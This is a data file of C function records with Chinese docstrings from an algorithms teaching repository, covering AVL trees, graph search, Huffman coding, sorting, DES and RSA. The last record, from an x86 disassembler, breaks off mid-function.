{"docstring": "/**\n \u5728 tree \u6240\u6307\u5b9a\u4e8c\u53c9\u641c\u7d22\u6811\u4e2d\u67e5\u627e node \u6307\u5b9a\u7684\u8282\u70b9\n\n @param tree \u4e8c\u53c9\u641c\u7d22\u6811\n @param node \u6307\u5b9a\u7684\u7ed3\u70b9\n @param data \u627e\u5230\u7684\u7ed3\u70b9\u6570\u636e\n @return \u627e\u5230\u8fd4\u56de0\uff1b\u5426\u5219\u8fd4\u56de-1\n */\n", "func_signal": "static int lookup(BisTree *tree, BiTreeNode *node, void **data)", "code": "{\n  int     cmpval, retval;\n\n  /// \u6ca1\u627e\u5230\u8282\u70b9\u8fd4\u56de -1\n  if (bitree_is_eob(node)) return -1;\n\n  cmpval = tree->compare(*data, ((AvlNode *)bitree_data(node))->data);\n\n  if (cmpval < 0) {\n\n    /// \u5904\u7406\u5de6\u5b50\u6811\n    retval = lookup(tree, bitree_left(node), data);\n\n  } else if (cmpval > 0) {\n\n    /// \u5904\u7406\u53f3\u5b50\u6811\n    retval = lookup(tree, bitree_right(node), data);\n\n  } else {\n\n    if (!((AvlNode *)bitree_data(node))->hidden) {\n\n      /// \u5c06\u627e\u5230\u7684\u8282\u70b9\u6570\u636e\u8fd4\u56de\n      *data = ((AvlNode *)bitree_data(node))->data;\n      retval = 0;\n\n    } else {\n\n      /// \u6ca1\u627e\u5230\u8282\u70b9\u8fd4\u56de -1\n      return -1;\n    }\n  }\n\n  return retval;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5b9e\u9645\u6267\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\n\n @param graph \u56fe\n @param adjlist \u90bb\u63a5\u8868\n @param ordered \u9876\u70b9\u94fe\u8868\n @return \u6210\u529f\u8fd4\u56de0\uff1b\u5426\u5219\u8fd4\u56de-1\n */\n", "func_signal": "static int dfs_main(Graph *graph, AdjList *adjlist, List *ordered)", "code": "{\n  AdjList     *clr_adjlist;\n  DfsVertex   *clr_vertex, *adj_vertex;\n  ListElmt    *member;\n\n  /// \u5c06\u9876\u70b9\u7740\u8272\u4e3a\u7070\u8272\u5e76\u904d\u5386\u5b83\u7684\u90bb\u63a5\u8868\n\n  ((DfsVertex *)adjlist->vertex)->color = gray;\n\n  for (member = list_head(&adjlist->adjacent); member != NULL; member = list_next(member)) {\n\n    /// \u786e\u5b9a\u4e0b\u4e00\u4e2a\u90bb\u63a5\u9876\u70b9\u7684\u989c\u8272\n\n    adj_vertex = list_data(member);\n\n    if (graph_adjlist(graph, adj_vertex, &clr_adjlist) != 0) return -1;\n\n    clr_vertex = clr_adjlist->vertex;\n\n    /// \u6df1\u5165\u90bb\u63a5\u9876\u70b9\u5982\u679c\u4e3a\u767d\u8272\n\n    if (clr_vertex->color == white) {\n\n      if (dfs_main(graph, clr_adjlist, ordered) != 0)return -1;\n\n    }\n  }\n\n  /// \u5c06\u5f53\u524d\u9876\u70b9\u7740\u8272\u4e3a\u9ed1\u8272\u5e76\u5c06\u5b83\u653e\u5728\u5217\u8868\u5934\n\n  ((DfsVertex *)adjlist->vertex)->color = black;\n\n  if (list_ins_next(ordered, NULL, (DfsVertex *)adjlist->vertex) != 0) return -1;\n\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/dfs.c", "commit_date": "2017-05-09 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5efa\u7acb\u970d\u592b\u66fc\u7f16\u7801\u8868\n\n @param node \u970d\u592b\u66fc\u6811\u7ed3\u70b9\n @param code \u5f53\u524d\u751f\u6210\u7684\u970d\u592b\u66fc\u7f16\u7801\n @param size \u7f16\u7801\u7684\u4f4d\u6570\n @param table \u970d\u592b\u66fc\u7f16\u7801\u7ed3\u679c\n */\n", "func_signal": "static void build_table(BiTreeNode *node, unsigned short code, unsigned char size, HuffCode *table)", "code": "{\n\n  if (!bitree_is_eob(node)) {\n\n    if (!bitree_is_eob(bitree_left(node))) {\n\n      /// \u5411\u5de6\u79fb\u52a8\u5e76\u5728\u7f16\u7801\u672b\u5c3e\u8ffd\u52a0 0\n      build_table(bitree_left(node), code << 1, size + 1, table);\n    }\n\n    if (!bitree_is_eob(bitree_right(node))) {\n\n      /// \u5411\u53f3\u79fb\u52a8\u5e76\u5728\u7f16\u7801\u672b\u5c3e\u8ffd\u52a0 1\n      build_table(bitree_right(node), (code << 1) | 0x0001, size + 1, table);\n    }\n\n    if (bitree_is_eob(bitree_left(node))&&bitree_is_eob(bitree_right(node))) {\n\n      /// \u786e\u4fdd\u5f53\u524d\u7f16\u7801\u662f\u4ee5\u5927\u7aef\u5b57\u8282\u683c\u5f0f\u5b58\u653e\n      code = htons(code);\n\n      /// \u5c06\u5f53\u524d\u7b26\u53f7\u7f16\u7801\u63d2\u5165\u53f6\u5b50\u8282\u70b9\n\n      table[((HuffNode *)bitree_data(node))->symbol].used = 1;\n      table[((HuffNode *)bitree_data(node))->symbol].code = code;\n      table[((HuffNode *)bitree_data(node))->symbol].size = size;\n    }\n  }\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/huffman.c", "commit_date": "2017-05-18 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u6267\u884c\u5de6\u65cb\u8f6c\n\n @param node \u4e8c\u53c9\u6811\u7ed3\u70b9\n */\n", "func_signal": "static void rotate_left(BiTreeNode **node)", "code": "{\n  BiTreeNode    *left, *grandchild;\n\n  left = bitree_left(*node);\n\n  if (((AvlNode *)bitree_data(left))->factor == AVL_LFT_HEAVY) {\n\n    /// \u6267\u884c LL ( Left-Left ) \u65cb\u8f6c\u64cd\u4f5c\n\n    bitree_left(*node) = bitree_right(left);\n    bitree_right(left) = *node;\n    ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n    ((AvlNode *)bitree_data(left))->factor = AVL_BALANCED;\n    *node = left;\n\n  } else {\n\n    /// \u6267\u884c LR ( Left-Right ) \u65cb\u8f6c\u64cd\u4f5c\n\n    grandchild = bitree_right(left);\n    bitree_right(left) = bitree_left(grandchild);\n    bitree_left(grandchild) = left;\n    bitree_left(*node) = bitree_right(grandchild);\n    bitree_right(grandchild) = *node;\n\n    switch (((AvlNode *)bitree_data(grandchild))->factor) {\n\n      case AVL_LFT_HEAVY:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_RGT_HEAVY;\n        ((AvlNode *)bitree_data(left))->factor = AVL_BALANCED;\n        break;\n\n      case AVL_BALANCED:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n        ((AvlNode *)bitree_data(left))->factor = AVL_BALANCED;\n        break;\n\n      case AVL_RGT_HEAVY:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n        ((AvlNode *)bitree_data(left))->factor = AVL_LFT_HEAVY;\n        break;\n\n    }\n\n    ((AvlNode *)bitree_data(grandchild))->factor = AVL_BALANCED;\n    *node = grandchild;\n  }\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5728 tree \u6240\u6307\u5b9a\u4e8c\u53c9\u6811\u4e2d\u9690\u85cf\u4e00\u4e2a node \u6240\u6307\u5b9a\u7ed3\u70b9\n\n @param tree \u4e8c\u53c9\u641c\u7d22\u6811\n @param node \u6307\u5b9a\u7684\u7ed3\u70b9\n @param data \u7ed3\u70b9\u6570\u636e\n @return \u6210\u529f\u8fd4\u56de0\uff1b\u5426\u5219\u8fd4\u56de-1\n */\n", "func_signal": "static int hide(BisTree *tree, BiTreeNode *node, const void *data)", "code": "{\n  int     cmpval, retval;\n\n  /// \u6ca1\u627e\u5230\u8282\u70b9\u8fd4\u56de -1\n  if (bitree_is_eob(node)) return -1;\n\n  cmpval = tree->compare(data, ((AvlNode *)bitree_data(node))->data);\n\n  if (cmpval < 0) {\n\n    /// \u5904\u7406\u5de6\u5b50\u6811\n    retval = hide(tree, bitree_left(node), data);\n\n  } else if (cmpval > 0) {\n\n    /// \u5904\u7406\u53f3\u5b50\u6811\n    retval = hide(tree, bitree_right(node), data);\n\n  } else {\n\n    /// \u5c06\u8282\u70b9\u6807\u8bb0\u4e3a\u9690\u85cf\n    ((AvlNode *)bitree_data(node))->hidden = 1;\n    retval = 0;\n  }\n\n  return retval;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u6bd4\u8f83\u4e24\u68f5\u970d\u592b\u66fc\u6811\u7684\u6839\u8282\u70b9\u9891\u7387\n\n @param tree1 \u970d\u592b\u66fc\u68111\n @param tree2 \u970d\u592b\u66fc\u68112\n @return tree1 \u5c0f\u4e8e tree1 \u8fd4\u56de1, tree1 \u5927\u4e8e tree1 \u8fd4\u56de -1, \u76f8\u7b49\u8fd4\u56de0\n */\n", "func_signal": "static int compare_freq(const void *tree1, const void *tree2)", "code": "{\n  HuffNode    *root1, *root2;\n\n  /// \u6bd4\u8f83\u4e24\u68f5\u5df2\u7ecf\u6392\u5e8f\u7684\u4e8c\u53c9\u6811\u6811\u6839\u8282\u70b9\n\n  root1 = (HuffNode *)bitree_data(bitree_root((const BiTree *)tree1));\n  root2 = (HuffNode *)bitree_data(bitree_root((const BiTree *)tree2));\n\n  if (root1->freq < root2->freq) return 1;\n  if (root1->freq > root2->freq) return -1;\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/huffman.c", "commit_date": "2017-05-18 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5c06\u4e24\u4e2a\u6709\u5e8f\u96c6\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u96c6\n\n @param data \u6570\u636e\u6570\u7ec4\n @param esize \u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\n @param i \u5143\u7d20\u5206\u533a\u8d77\u70b9\n @param j \u5143\u7d20\u4e2d\u95f4\u5143\u7d20\u4f4d\u7f6e\n @param k \u5143\u7d20\u5206\u533a\u7ec8\u70b9\n @param compare \u51fd\u6570\u6307\u9488\uff0c\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u6210\u5458\u5927\u5c0f\uff08\u5927\u4e8e\u8fd4\u56de 1\uff0c\u5c0f\u4e8e\u8fd4\u56de -1\uff0c\u7b49\u4e8e\u8fd4\u56de 0\uff09\n @return \u6210\u529f\u8fd4\u56de 0\uff1b\u5426\u5219\u8fd4\u56de -1\n */\n", "func_signal": "static int merge(void *data, int esize, int i, int j, int k,\n                 int (*compare)(const void *key1, const void *key2))", "code": "{\n  char      *a = data, *m;\n  int       ipos, jpos, mpos;\n\n  /// \u521d\u59cb\u5316\u5408\u5e76\u8fc7\u7a0b\u4f7f\u7528\u7684\u8ba1\u6570\u5668\n  ipos = i;\n  jpos = j + 1;\n  mpos = 0;\n\n  /// \u521b\u5efa\u7528\u4e8e\u5408\u5e76\u6570\u7ec4\u7684\u7a7a\u95f4\n  if ((m = (char *)malloc(esize * ((k - i) + 1))) == NULL) return -1;\n\n  /// \u6267\u884c\u5408\u5e76\u76f4\u5230\u6ca1\u6709\u6570\u636e\n\n  while (ipos <= j || jpos <= k) {\n\n    if (ipos > j) {\n\n      /// \u5de6\u534a\u90e8\u5206\u8fd8\u6709\u5143\u7d20\n      while (jpos <= k) {\n\n        memcpy(&m[mpos * esize], &a[jpos * esize], esize);\n        jpos++;\n        mpos++;\n      }\n\n      continue;\n\n    } else if (jpos > k) {\n\n      /// \u53f3\u534a\u90e8\u5206\u8fd8\u6709\u5143\u7d20\n      while (ipos <= j) {\n\n        memcpy(&m[mpos * esize], &a[ipos * esize], esize);\n        ipos++;\n        mpos++;\n\n      }\n\n      continue;\n    }\n\n    /// \u6dfb\u52a0\u4e0b\u4e00\u4e2a\u5143\u7d20\u5230\u5df2\u6392\u5e8f\u6570\u7ec4\n\n    if (compare(&a[ipos * esize], &a[jpos * esize]) < 0) {\n\n      memcpy(&m[mpos * esize], &a[ipos * esize], esize);\n      ipos++;\n      mpos++;\n\n    } else {\n\n      memcpy(&m[mpos * esize], &a[jpos * esize], esize);\n      jpos++;\n      mpos++;\n\n    }\n  }\n\n  /// \u5c06\u5df2\u6392\u5e8f\u6570\u636e\u653e\u56de\n  memcpy(&a[i * esize], m, esize * ((k - i) + 1));\n\n  /// \u9500\u6bc1\u7528\u4e8e\u6392\u5e8f\u7684\u4e34\u65f6\u7a7a\u95f4\n  free(m);\n\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/mgsort.c", "commit_date": "2017-05-12 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u6267\u884c\u53f3\u65cb\u8f6c\n\n @param node \u4e8c\u53c9\u6811\u7ed3\u70b9\n */\n", "func_signal": "static void rotate_right(BiTreeNode **node)", "code": "{\n  BiTreeNode    *right, *grandchild;\n\n  right = bitree_right(*node);\n\n  if (((AvlNode *)bitree_data(right))->factor == AVL_RGT_HEAVY) {\n\n    /// \u6267\u884c RR ( Right-Right ) \u65cb\u8f6c\u64cd\u4f5c\n\n    bitree_right(*node) = bitree_left(right);\n    bitree_left(right) = *node;\n    ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n    ((AvlNode *)bitree_data(right))->factor = AVL_BALANCED;\n    *node = right;\n\n  } else {\n\n    /// \u6267\u884c RR ( Right-Right ) \u65cb\u8f6c\u64cd\u4f5c\n\n    grandchild = bitree_left(right);\n    bitree_left(right) = bitree_right(grandchild);\n    bitree_right(grandchild) = right;\n    bitree_right(*node) = bitree_left(grandchild);\n    bitree_left(grandchild) = *node;\n\n    switch (((AvlNode *)bitree_data(grandchild))->factor) {\n\n      case AVL_LFT_HEAVY:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n        ((AvlNode *)bitree_data(right))->factor = AVL_RGT_HEAVY;\n        break;\n\n      case AVL_BALANCED:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n        ((AvlNode *)bitree_data(right))->factor = AVL_BALANCED;\n        break;\n\n      case AVL_RGT_HEAVY:\n\n        ((AvlNode *)bitree_data(*node))->factor = AVL_LFT_HEAVY;\n        ((AvlNode *)bitree_data(right))->factor = AVL_BALANCED;\n        break;\n\n    }\n\n    ((AvlNode *)bitree_data(grandchild))->factor = AVL_BALANCED;\n    *node = grandchild;\n  }\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n DES \u52a0\u89e3\u5bc6\u4e3b\u51fd\u6570\n\n @param source \u6e90\u7f13\u51b2\u533a\n @param target \u7ed3\u679c\u7f13\u51b2\u533a\n @param key \u6307\u5b9a64\u4f4d\u7684\u5bc6\u94a5\uff08NULL \u8868\u793a\u91cd\u7528\u5b50\u5bc6\u94a5\uff09\n @param direction \u6267\u884c\u52a0\u5bc6\u6216\u89e3\u5bc6\u64cd\u4f5c\n @return \u6267\u884c\u6210\u529f\u8fd4\u56de 0\n */\n", "func_signal": "static int des_main(const unsigned char *source, unsigned char *target,\n                    const unsigned char *key, DesEorD direction)", "code": "{\n  static unsigned char subkeys[16][7];\n  unsigned char         temp[8], lkey[4], rkey[4], lblk[6], rblk[6], fblk[6], xblk[6], sblk;\n  int                   row, col, i, j, k, p;\n\n  /// \u5982\u679c key \u4e3a NULL\uff0c\u4f7f\u7528\u4e0a\u6b21\u8ba1\u7b97\u7684\u5b50\u5bc6\u94a5\n  if (key != NULL) {\n\n    /// \u62f7\u8d1d\u4e00\u4efd key \u6570\u636e\u5230\u672c\u5730\n    memcpy(temp, key, 8);\n\n    /// \u5c06 key \u538b\u7f29\u7f6e\u6362\u4e3a 56 \u4f4d\n    permute(temp, DesTransform, 56);\n\n    /// \u5c06 key \u5206\u4e3a\u4e24\u4e2a 28 \u4f4d\n    memset(lkey, 0, 4);\n    memset(rkey, 0, 4);\n\n    for (j = 0; j < 28; j++) {\n      bit_set(lkey, j, bit_get(temp, j));\n      bit_set(rkey, j, bit_get(temp, j + 28));\n    }\n\n    /// \u6309\u7167\u8f6e\u6b21\u8ba1\u7b97\u5b50 key\n    for (i = 0; i < 16; i++) {\n\n      /// \u6839\u636e\u5b50\u5bc6\u94a5\u7684\u5e8f\u5217\u503c\u65cb\u8f6c\u4e24\u7ec4 key\n      bit_rot_left(lkey, 28, DesRotations[i]);\n      bit_rot_left(rkey, 28, DesRotations[i]);\n\n      /// \u91cd\u65b0\u5408\u5e76\u5404\u4e2a\u7ec4\u5230\u4e00\u4e2a subkey\n      for (j = 0; j < 28; j++) {\n        bit_set(subkeys[i], j, bit_get(lkey, j));\n        bit_set(subkeys[i], j + 28, bit_get(rkey, j));\n      }\n\n      /// \u5bf9\u91cd\u7ec4\u540e\u7684\u5bc6\u94a5\u8fdb\u884c\u7f6e\u6362\n      permute(subkeys[i], DesPermuted, 48);\n    }\n  }\n\n  /// \u62f7\u8d1d\u4e00\u4efd\u6e90\u6570\u636e\u5230\u672c\u5730\n  memcpy(temp, source, 8);\n\n  /// \u6267\u884c\u521d\u59cb\u7f6e\u6362\n  permute(temp, DesInitial, 64);\n\n  /// \u5c06\u6570\u636e\u5757\u5206\u4e3a\u4e24\u4e2a 32 \u4f4d\u7684\u7ec4\n  memcpy(lblk, &temp[0], 4);\n  memcpy(rblk, &temp[4], 4);\n\n  /// \u52a0\u5bc6\u6216\u8005\u89e3\u5bc6\u6e90\u6570\u636e\n  for (i = 0; i < 16; i++) {\n\n    /// \u5f00\u59cb\u6267\u884c\u8ba1\u7b97\u51fd\u6570 f\n\n    memcpy(fblk, rblk, 4);\n\n    /// \u6267\u884c\u6269\u5c55\u7f6e\u6362\uff0c\u5c06\u53f3\u6570\u636e\u4ece 32 \u4f4d\u6269\u5c55\u5230 48 \u4f4d\n    permute(fblk, DesExpansion, 48);\n\n    /// \u8ba1\u7b97\u4e0e\u8fd9\u4e00\u8f6e\u7684\u5b50\u5bc6\u94a5\u7684\u5f02\u6216\u503c\n    if (direction == encipher) {\n\n      /// \u5982\u679c\u662f\u52a0\u5bc6\uff0c\u5b50\u5bc6\u94a5\u6309\u987a\u5e8f\u6267\u884c\n      bit_xor(fblk, subkeys[i], xblk, 48);\n\n    } else {\n\n      /// \u5982\u679c\u662f\u89e3\u5bc6\uff0c\u5b50\u5bc6\u94a5\u6309\u9006\u5e8f\u6267\u884c\n      bit_xor(fblk, subkeys[15 - i], xblk, 48);\n\n    }\n    \n    memcpy(fblk, xblk, 6);\n\n    /// \u6267\u884c\u4e00\u7cfb\u5217\u7684 S \u76d2\u66ff\u6362\u64cd\u4f5c\n\n    p = 0;\n\n    for (j = 0; j < 8; j++) {\n\n      /// \u8ba1\u7b97 S \u76d2\u64cd\u4f5c\u7684\u884c\u4e0e\u5217\u503c\n      row = (bit_get(fblk, (j * 6)+0) * 2) + (bit_get(fblk, (j * 6)+5) * 1);\n      col = (bit_get(fblk, (j * 6)+1) * 8) + (bit_get(fblk, (j * 6)+2) * 4) +\n            (bit_get(fblk, (j * 6)+3) * 2) + (bit_get(fblk, (j * 6)+4) * 1);\n\n      /// \u6839\u636e\u524d\u9762\u8ba1\u7b97\u51fa\u7684 6 \u4f4d\u7ec4\u6267\u884c S \u76d2\u64cd\u4f5c\n\n      sblk = (unsigned char)DesSbox[j][row][col];\n\n      for (k = 4; k < 8; k++) {\n\n        bit_set(fblk, p, bit_get(&sblk, k));\n        p++;\n      }\n    }\n\n    /// \u901a\u8fc7 P \u76d2\u6765\u7f6e\u6362\n    permute(fblk, DesPbox, 32);\n\n    /// \u5c31\u7b97\u5de6\u5206\u7ec4\u6570\u636e\u4e0e\u51fd\u6570 f \u7ed3\u679c\u7684\u5f02\u6216\u503c\n    bit_xor(lblk, fblk, xblk, 32);\n\n    /// \u5de6\u53f3\u5206\u7ec4\u4ea4\u6362\u7136\u540e\u5f00\u59cb\u4e0b\u4e00\u8f6e\n    memcpy(lblk, rblk, 4);\n    memcpy(rblk, xblk, 4);\n  }\n\n  /// \u5c06\u6700\u540e\u7684\u5de6\u53f3\u5206\u7ec4\u6570\u636e\u5408\u5e76\u5230\u7ed3\u679c\u6570\u636e\n  memcpy(&target[0], rblk, 4);\n  memcpy(&target[4], lblk, 4);\n\n  /// \u6267\u884c\u6700\u7ec8\u7f6e\u6362\n  permute(target, DesFinal, 64);\n\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/des.c", "commit_date": "2017-05-22 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u79fb\u9664\u7531 tree \u6307\u5b9a\u4e8c\u53c9\u6811\u4e2d node \u7684\u5de6\u5b50\u7ed3\u70b9\u4e3a\u6839\u7684\u5b50\u6811\n\n @param tree \u641c\u7d22\u4e8c\u53c9\u6811\n @param node \u6307\u5b9a\u7ed3\u70b9\n */\n", "func_signal": "static void destroy_left(BisTree *tree, BiTreeNode *node)", "code": "{\n  BiTreeNode    **position;\n\n  /// \u4e0d\u5141\u8bb8\u5728\u7a7a\u6811\u4e2d\u6267\u884c\u79fb\u9664\n  if (bitree_size(tree) == 0) return;\n\n  /// \u786e\u5b9a\u79fb\u9664\u7ed3\u70b9\u7684\u4f4d\u7f6e\n  if (node == NULL) {\n    position = &tree->root;\n  } else {\n    position = &node->left;\n  }\n\n  /// \u79fb\u9664\u7ed3\u70b9\n  if (*position != NULL) {\n\n    destroy_left(tree, *position);\n    destroy_right(tree, *position);\n\n    if (tree->destroy != NULL) {\n      /// \u6267\u884c\u7528\u6237\u6307\u5b9a\u7684 destroy \u51fd\u6570\n      tree->destroy(((AvlNode *)(*position)->data)->data);\n    }\n\n    /// \u6e05\u7406 AVL \u6570\u636e\u7ed3\u6784\u548c\u7ed3\u70b9\u6570\u636e\n    free((*position)->data);\n    free(*position);\n    *position = NULL;\n\n    /// \u66f4\u65b0\u6811\u7684 size\n    tree->size--;\n  }\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u8ba1\u7b97\u5e42\u6a21 - \u4f7f\u7528\u79f0\u4e3a\u4e8c\u8fdb\u5236\u5e73\u65b9-\u4e58\u7684\u7b97\u6cd5\n\n @param a \u660e\u6587\u5206\u7ec4\n @param b \u516c\u94a5\u7684 e \u6216 \u79c1\u94a5\u7684d\n @param n \u516c\u94a5\u7684 n \u6216 \u79c1\u94a5\u7684n\n @return \u5e42\u6a21\u7ed3\u679c\n */\n", "func_signal": "static Huge modexp(Huge a, Huge b, Huge n)", "code": "{\n  Huge        y;\n\n  /// \u4f7f\u7528\u4e8c\u8fdb\u5236\u5e73\u65b9-\u4e58\u7684\u7b97\u6cd5\u8ba1\u7b97 a \u7684 b \u6b21\u5e42\n\n  /// \u5bc4\u5b58\u5668 y \u521d\u59cb\u503c\u4e3a1\n  y = 1;\n\n  while (b != 0) {\n\n    /// \u6bcf\u5f53\u9047\u5230 b \u4e2d\u4e3a 1 \u7684\u4f4d\u65f6\uff0c\u5c31\u5c06\u5f53\u524d\u7684 a \u503c\u4e58\u4e0a\u53e6\u4e00\u4e2a\u5bc4\u5b58\u5668 y\n    if (b & 1) {\n      y = (y * a) % n;\n    }\n\n    /// \u5bf9b\u7684\u6bcf\u4e2a\u4f4d\u6267\u884c\u5e73\u65b9\u64cd\u4f5c\n    a = (a * a) % n;\n\n    /// \u51c6\u5907b\u7684\u4e0b\u4e00\u4e2a\u4f4d\n    b = b >> 1;\n  }\n\n  return y;\n}", "path": "LearningMasteringAlgorithms-C/source/rsa.c", "commit_date": "2017-05-27 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5206\u533a\u6392\u5e8f\u51fd\u6570\n\n @param data \u6570\u636e\u6570\u7ec4\n @param esize \u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\n @param i \u5143\u7d20\u5206\u533a\u8d77\u70b9\n @param k \u5143\u7d20\u5206\u533a\u7ec8\u70b9\n @param compare \u51fd\u6570\u6307\u9488\uff0c\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u6210\u5458\u5927\u5c0f\uff08\u5927\u4e8e\u8fd4\u56de 1\uff0c\u5c0f\u4e8e\u8fd4\u56de -1\uff0c\u7b49\u4e8e\u8fd4\u56de 0\uff09\n @return \u6210\u529f\u8fd4\u56de 0\uff1b\u5426\u5219\u8fd4\u56de -1\n */\n", "func_signal": "static int partition(void *data, int esize, int i, int k,\n                     int (*compare)(const void *key1, const void *key2))", "code": "{\n  char      *a = data;\n  void      *pval, *temp;\n  int       r[3];\n\n  /// \u521d\u59cb\u5316\u5206\u533a\u5143\u7d20\u548c\u4e34\u65f6\u7a7a\u95f4\n\n  if ((pval = malloc(esize)) == NULL) return -1;\n\n  if ((temp = malloc(esize)) == NULL) {\n\n    free(pval);\n    return -1;\n  }\n\n  /// \u4f7f\u7528\u4e2d\u4f4d\u6570\u6cd5\u627e\u5206\u533a\u503c\n  r[0] = (rand() % (k - i + 1)) + i;\n  r[1] = (rand() % (k - i + 1)) + i;\n  r[2] = (rand() % (k - i + 1)) + i;\n  issort(r, 3, sizeof(int), compare_int);\n  memcpy(pval, &a[r[1] * esize], esize);\n\n  /// \u5728\u5206\u533a\u5143\u7d20\u5468\u56f4\u521b\u5efa\u5206\u533a\u7a7a\u95f4\n  i--;\n  k++;\n\n  while (1) {\n\n    /// \u5c06 k \u5f80\u5de6\u8fb9\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5c0f\u4e8e\u6216\u7b49\u4e8e\u5206\u5272\u503c\u7684\u5143\u7d20\n    do {\n      k--;\n    } while (compare(&a[k * esize], pval) > 0);\n\n    /// \u5c06 i \u5f80\u53f3\u8fb9\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5927\u4e8e\u6216\u7b49\u4e8e\u5206\u5272\u503c\u7684\u5143\u7d20\n    do {\n      i++;\n    } while (compare(&a[i * esize], pval) < 0);\n\n    if (i >= k) {\n      /// \u5f53 i \u8ddf k \u91cd\u5408\u6216\u8005\u4ea4\u53c9\u65f6\u6392\u5e8f\u5b8c\u6210\n      break;\n\n    } else {\n\n      /// \u4ea4\u6362\u627e\u5230\u5143\u7d20\u7684\u4f4d\u7f6e\n      memcpy(temp, &a[i * esize], esize);\n      memcpy(&a[i * esize], &a[k * esize], esize);\n      memcpy(&a[k * esize], temp, esize);\n\n    }\n  }\n\n  /// \u9500\u6bc1\u6392\u5e8f\u6240\u9700\u7a7a\u95f4\n  free(pval);\n  free(temp);\n\n  /// \u8fd4\u56de\u533a\u5206\u5206\u533a\u7684\u4f4d\u7f6e\n  return k;\n}", "path": "LearningMasteringAlgorithms-C/source/qksort.c", "commit_date": "2017-05-12 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u6bd4\u8f83\u4e24\u4e2a\u6574\u6570\uff08\u7528\u4e8e\u4e09\u4f4d\u6570\u53d6\u4e2d\u503c\uff09\n\n @param int1 \u6574\u6570 1\n @param int2 \u6574\u6570 2\n @return \u5927\u4e8e\u8fd4\u56de 1\uff0c\u5c0f\u4e8e\u8fd4\u56de -1\uff0c\u7b49\u4e8e\u8fd4\u56de 0\n */\n", "func_signal": "static int compare_int(const void *int1, const void *int2)", "code": "{\n  if (*(const int *)int1 > *(const int *)int2) return 1;\n  if (*(const int *)int1 < *(const int *)int2) return -1;\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/qksort.c", "commit_date": "2017-05-12 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/* Searches the instruction tables for the right entry.\n */\n", "func_signal": "static int search_itab( struct ud * u )", "code": "{\n    const struct ud_itab_entry * e = NULL;\n    enum ud_itab_index table;\n    uint8_t peek;\n    uint8_t did_peek = 0;\n    uint8_t curr; \n    uint8_t index;\n\n    /* if in state of error, return */\n    if ( u->error ) \n        return -1;\n\n    /* get first byte of opcode. */\n    inp_next(u); \n    if ( u->error ) \n        return -1;\n    curr = inp_curr(u); \n\n    /* resolve xchg, nop, pause crazyness */\n    if ( 0x90 == curr ) {\n        if ( !( u->dis_mode == 64 && REX_B( u->pfx_rex ) ) ) {\n            if ( u->pfx_rep ) {\n                u->pfx_rep = 0;\n                e = & ie_pause;\n            } else {\n                e = & ie_nop;\n            }\n            goto found_entry;\n        }\n    }\n\n    /* get top-level table */\n    if ( 0x0F == curr ) {\n        table = ITAB__0F;\n        curr  = inp_next(u);\n        if ( u->error )\n            return -1;\n\n        /* 2byte opcodes can be modified by 